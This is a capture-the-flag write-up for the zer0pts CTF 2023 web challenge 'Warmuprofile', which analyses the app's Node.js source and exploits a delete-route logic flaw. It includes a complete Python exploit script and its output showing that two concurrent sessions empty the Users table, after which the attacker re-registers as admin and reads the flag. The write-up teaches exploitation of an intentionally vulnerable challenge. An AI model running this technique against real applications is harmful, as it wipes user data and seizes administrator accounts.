# Warmuprofile

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Conclusion](#conclusion)

## Overview

- Solved by: @taiwhis (Fox), @.st1ckk (St1ck)
- Contributor: @siunam
- 48 solves / 137 points
- Overall difficulty for me (From 1-10 stars): ★★★★★★★★★☆

## Background

I made an app to share your profile.  
[http://others.2023.zer0pts.com:8600/](http://others.2023.zer0pts.com:8600/)  
[http://misc.2023.zer0pts.com:8600/](http://misc.2023.zer0pts.com:8600/) (backup)  
[http://misc2.2023.zer0pts.com:8600/](http://misc2.2023.zer0pts.com:8600/) (US)  
[http://misc3.2023.zer0pts.com:8600/](http://misc3.2023.zer0pts.com:8600/) (EU)  

Note: Click "Spawn container" to make a challenge container only for you. When writing exploits, be careful that the container asks for BASIC auth credentials.

![](https://github.com/siunam321/CTF-Writeups/blob/main/zer0pts-CTF-2023/images/Pasted%20image%2020230716124827.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/zer0pts-CTF-2023/web/Warmuprofile/warmuprofile_80841914cb6ef9b9cdb84c3234ff8704.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/zer0pts-CTF-2023/web/Warmuprofile)-[2023.07.16|12:49:14(HKT)]
└> file warmuprofile_80841914cb6ef9b9cdb84c3234ff8704.tar.gz 
warmuprofile_80841914cb6ef9b9cdb84c3234ff8704.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 102400
┌[siunam♥Mercury]-(~/ctf/zer0pts-CTF-2023/web/Warmuprofile)-[2023.07.16|12:49:17(HKT)]
└> tar xf warmuprofile_80841914cb6ef9b9cdb84c3234ff8704.tar.gz 
```

**Setup the local environment for testing:**
```shell
┌[siunam♥Mercury]-(~/ctf/zer0pts-CTF-2023/web/Warmuprofile)-[2023.07.16|12:53:24(HKT)]
└> cd warmuprofile 
┌[siunam♥Mercury]-(~/ctf/zer0pts-CTF-2023/web/Warmuprofile/warmuprofile)-[2023.07.16|12:53:26(HKT)]
└> sudo docker-compose build
[...]
┌[siunam♥Mercury]-(~/ctf/zer0pts-CTF-2023/web/Warmuprofile/warmuprofile)-[2023.07.16|12:53:33(HKT)]
└> sudo docker-compose up
Starting warmuprofile_app_1 ... done
Attaching to warmuprofile_app_1
app_1  | (node:1) [DEP0170] DeprecationWarning: The URL sqlite::memory: is invalid. Future versions of Node.js will throw an error.
app_1  | (Use `node --trace-deprecation ...` to show where the warning was created)
app_1  | Executing (default): SELECT 1+1 AS result
app_1  | Executing (default): DROP TABLE IF EXISTS `Users`;
app_1  | Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) NOT NULL UNIQUE, `password` VARCHAR(255) NOT NULL, `profile` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
app_1  | Executing (default): PRAGMA INDEX_LIST(`Users`)
app_1  | Executing (default): PRAGMA INDEX_INFO(`sqlite_autoindex_Users_1`)
app_1  | Executing (default): INSERT INTO `Users` (`id`,`username`,`password`,`profile`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5);
app_1  | Warning: connect.session() MemoryStore is not
app_1  | designed for a production environment, as it will leak
app_1  | memory, and will not scale past a single process.
app_1  | started
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/zer0pts-CTF-2023/images/Pasted%20image%2020230716125405.png)

In here, we can register or login an account.

Let's register a new account!

![](https://github.com/siunam321/CTF-Writeups/blob/main/zer0pts-CTF-2023/images/Pasted%20image%2020230716125627.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/zer0pts-CTF-2023/images/Pasted%20image%2020230716125646.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/zer0pts-CTF-2023/images/Pasted%20image%2020230716125712.png)

After logged in, we can check, delete our own profile, and get the flag but for admin only.

Now, we can review the source code!

**In `index.js`, the SQLite database is created:**
```js
// set up DB
const User = sequelize.define('User', {
    username: {
        type: DataTypes.STRING,
        allowNull: false,
        unique: true
    },
    password: {
        type: DataTypes.STRING,
        allowNull: false
    },
    profile: {
        type: DataTypes.STRING
    }
}, {});
await User.sync({ force: true });
await User.create({
    username: 'admin',
    password: crypto.randomUUID(),
    profile: 'Hi, I am admin.'
});
```

After the table `User` with column `username`, `password`, `profile` is created, **it'll insert a new user called `admin`.**

**Also, there's a POST route called `/register`:**
```js
app.post('/register', async (req, res) => {
    // make sure given username and password are valid
    const { username, password, profile } = req.body;
    if (!username || !password || !profile) {
        flash(req, 'username, password, or profile not provided');
        return res.redirect('/register');
    }
    if (typeof username !== 'string' || typeof password !== 'string' || typeof profile !== 'string') {
        flash(req, 'invalid username, password, or profile');
        return res.redirect('/register');
    }

    // make sure that the requested username does not exist
    const user = await User.findOne({
        where: { username }
    });
    if (user != null) {
        flash(req, 'user exists');
        return res.redirect('/register');
    }

    // okay, create a user
    await User.create({
        username, password, profile
    });

    req.session.loggedIn = true;
    req.session.username = username;

    return res.redirect('/');
});
```

In here, it first checks the username exists or not.

So, we can't just overwrite the `admin` user via registering a new account.

**In POST route `/user/:username/delete`, we can delete our own profile:**
```js
app.post('/user/:username/delete', needAuth, async (req, res) => {
    const { username } = req.params;
    const { username: loggedInUsername } = req.session;
    if (loggedInUsername !== 'admin' && loggedInUsername !== username) {
        flash(req, 'general user can only delete itself');
        return res.redirect('/');
    }

    // find user to be deleted
    const user = await User.findOne({
        where: { username }
    });

    await User.destroy({
        where: { ...user?.dataValues }
    });

    // user is deleted, so session should be logged out
    req.session.destroy();
    return res.redirect('/');
});
```

It'll first check the logged in username is `admin` or the same username as the POST parameter's value.

Then, it'll find the `username`'s data.

Finally, delete the `user`'s data and destroy the session.

## Exploitation

Hmm... I wonder **what if we logged in to the same account with 2 different session, and delete the profile?** Will it delete all users in the second deletion as the `user` is empty?

Now, there're 2 session logged in to the same account, even if we delete the account in the first session, the second session is still valid, thus the delete profile route is vulnerable to business logic vulnerability, where it doesn't check the current session's user is deleted or not.

- Session 1 delete `foo` user:

1. POST to `/user/foo/delete`
2. `username` = `foo`
3. `loggedInUsername` = `foo`
4. `user` = `username: 'foo', password: 'bar', profile: 'foobar'`
5. Delete record's data via `user`

- Session 2 delete `foo` user:

1. POST to `/user/foo/delete`
2. `username` = `foo`
3. `loggedInUsername` = `foo`
4. **`user` = `null`**
5. **Delete table `User` due to empty `where` clause: `User.destory({ where: {} })`**

**Let's write a Python script!**
```python
#!/usr/bin/env python3
import requests
from base64 import b64encode
from bs4 import BeautifulSoup

class Exploit:
    def __init__(self, baseUrl, isLocal, basicAuthUsername, basicAuthPassword):
        self.baseUrl = baseUrl
        self.isLocal = isLocal
        self.basicAuthUsername = basicAuthUsername
        self.basicAuthPassword = basicAuthPassword

    def basicAuth(self):
        token = b64encode(f'{self.basicAuthUsername}:{self.basicAuthPassword}'.encode('utf-8')).decode('ascii')
        return f'Basic {token}'

    def sendRequest(self, session, method, endpoint, data=None):
        isPostMethod = True if method.lower() == 'post' else False
        isGetMethod = True if method.lower() == 'get' else False
        headers = {'Authorization' : self.basicAuth()} if basicAuthUsername is not None and basicAuthPassword is not None else None

        if isPostMethod:
            if self.isLocal:
                response = session.post(f'{self.baseUrl}{endpoint}', data=data)
                return response.text

            response = session.post(f'{self.baseUrl}{endpoint}', data=data, headers=headers)
            return response.text

        if isGetMethod:
            if self.isLocal:
                response = session.get(f'{self.baseUrl}{endpoint}')
                return response.text

            response = session.get(f'{self.baseUrl}{endpoint}', headers=headers)
            return response.text

if __name__ == '__main__':
    isLocal = True
    basicAuthUsername = None
    basicAuthPassword = None
    baseUrl = 'http://localhost:8600'
    exploit = Exploit(baseUrl, isLocal, basicAuthUsername, basicAuthPassword)

    session1 = requests.Session()
    session2 = requests.Session()
    # Register an account
    username = 'foo'
    password = 'bar'
    registerData = {
        'username': username,
        'password': password,
        'profile': 'foobar'
    }
    print(f'[*] Registering new account "{username}" in session 1')
    exploit.sendRequest(session1, 'POST', '/register', registerData)
    
    # Login to the account with 2 different session
    loginData = {
        'username': username,
        'password': password
    }
    print(f'[*] Logging in to new account "{username}" in session 1')
    exploit.sendRequest(session1, 'POST', '/login', loginData)
    print(f'[*] Logging in to new account "{username}" in session 2')
    exploit.sendRequest(session2, 'POST', '/login', loginData)

    # Delete the first and second session's user
    deleteUserEndpoint = f'/user/{username}/delete'
    print(f'[*] Deleting new account "{username}" in session 1')
    exploit.sendRequest(session1, 'POST', deleteUserEndpoint)
    print(f'[*] Deleting new account "{username}" in session 2')
    exploit.sendRequest(session2, 'POST', deleteUserEndpoint)

    # Register our new "admin" user as the `Users` table is deleted
    overwriteAdminUserData = {
        'username': 'admin',
        'password': 'admin',
        'profile': 'never_gonna_give_you_up'
    }
    print(f'[*] Overwriting old admin user in session 1')
    overwriteAdminUserResponse = exploit.sendRequest(session1, 'POST', '/register', overwriteAdminUserData)
    if 'user exists' in overwriteAdminUserResponse:
        print(f'[-] Failed to overwrite the admin user...')
        exit()

    # Get the flag as the new admin user
    print(f'[*] Getting the flag in session 1')
    flagResponse = exploit.sendRequest(session1, 'GET', '/flag')
    if 'The flag is:' not in flagResponse:
        print(f'[-] Failed to get the flag...')
        exit()

    soup = BeautifulSoup(flagResponse, 'html.parser')
    flag = soup.code.get_text()
    print(f'[+] Flag: {flag}')
```

```shell
┌[siunam♥Mercury]-(~/ctf/zer0pts-CTF-2023/web/Warmuprofile)-[2023.07.16|13:56:37(HKT)]
└> python3 solve.py
[*] Registering new account "foo" in session 1
[*] Logging in to new account "foo" in session 1
[*] Logging in to new account "foo" in session 2
[*] Deleting new account "foo" in session 1
[*] Deleting new account "foo" in session 2
[*] Overwriting old admin user in session 1
[*] Getting the flag in session 1
[+] Flag: nek0pts{FAKE_FLAG}
```

**Server log:**
```shell
app_1  | Executing (default): SELECT `id`, `username`, `password`, `profile`, `createdAt`, `updatedAt` FROM `Users` AS `User` WHERE `User`.`username` = 'foo';
app_1  | Executing (default): INSERT INTO `Users` (`id`,`username`,`password`,`profile`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5);
app_1  | Executing (default): SELECT `id`, `username`, `password`, `profile`, `createdAt`, `updatedAt` FROM `Users` AS `User` WHERE `User`.`username` = 'foo';
app_1  | Executing (default): SELECT `id`, `username`, `password`, `profile`, `createdAt`, `updatedAt` FROM `Users` AS `User` WHERE `User`.`username` = 'foo' AND `User`.`password` = 'bar';
app_1  | Executing (default): SELECT `id`, `username`, `password`, `profile`, `createdAt`, `updatedAt` FROM `Users` AS `User` WHERE `User`.`username` = 'foo';
app_1  | Executing (default): SELECT `id`, `username`, `password`, `profile`, `createdAt`, `updatedAt` FROM `Users` AS `User` WHERE `User`.`username` = 'foo' AND `User`.`password` = 'bar';
app_1  | Executing (default): SELECT `id`, `username`, `password`, `profile`, `createdAt`, `updatedAt` FROM `Users` AS `User` WHERE `User`.`username` = 'foo';
app_1  | Executing (default): SELECT `id`, `username`, `password`, `profile`, `createdAt`, `updatedAt` FROM `Users` AS `User` WHERE `User`.`username` = 'foo';
app_1  | Executing (default): DELETE FROM `Users` WHERE `id` = 21 AND `username` = 'foo' AND `password` = 'bar' AND `profile` = 'foobar' AND `createdAt` = '2023-07-16 05:56:37.598 +00:00' AND `updatedAt` = '2023-07-16 05:56:37.598 +00:00'
app_1  | Executing (default): SELECT `id`, `username`, `password`, `profile`, `createdAt`, `updatedAt` FROM `Users` AS `User` WHERE `User`.`username` = 'foo';
app_1  | Executing (default): DELETE FROM `Users`
app_1  | Executing (default): SELECT `id`, `username`, `password`, `profile`, `createdAt`, `updatedAt` FROM `Users` AS `User` WHERE `User`.`username` = 'admin';
app_1  | Executing (default): INSERT INTO `Users` (`id`,`username`,`password`,`profile`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5);
app_1  | Executing (default): SELECT `id`, `username`, `password`, `profile`, `createdAt`, `updatedAt` FROM `Users` AS `User` WHERE `User`.`username` = 'admin';
```

**As you can see, table `Users` is deleted, and our new `admin` user is inserted!!**

**Finally, let's spawn the instance's container, and get the real flag!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/zer0pts-CTF-2023/images/Pasted%20image%2020230716135802.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/zer0pts-CTF-2023/images/Pasted%20image%2020230716135807.png)

- Change the `isLocal`, `basicAuthUsername`, `basicAuthPassword`, `baseUrl` variable in the Python script:

```python
if __name__ == '__main__':
    isLocal = False
    basicAuthUsername = 'oIYaJLEmXCFMdDAv'
    basicAuthPassword = 'DlfzqYvBZrWJHERo'
    baseUrl = 'http://others.2023.zer0pts.com:64177'
```

```shell
┌[siunam♥Mercury]-(~/ctf/zer0pts-CTF-2023/web/Warmuprofile)-[2023.07.16|13:58:49(HKT)]
└> python3 solve.py
[*] Registering new account "foo" in session 1
[*] Logging in to new account "foo" in session 1
[*] Logging in to new account "foo" in session 2
[*] Deleting new account "foo" in session 1
[*] Deleting new account "foo" in session 2
[*] Overwriting old admin user in session 1
[*] Getting the flag in session 1
[+] Flag: zer0pts{fire_ice_storm_di_acute_brain_damned_jugem_bayoen_bayoen_bayoen_10cefab0}
```

Nice!

- **Flag: `zer0pts{fire_ice_storm_di_acute_brain_damned_jugem_bayoen_bayoen_bayoen_10cefab0}`**

## Conclusion

What we've learned:

1. Exploiting Business Logic Vulnerability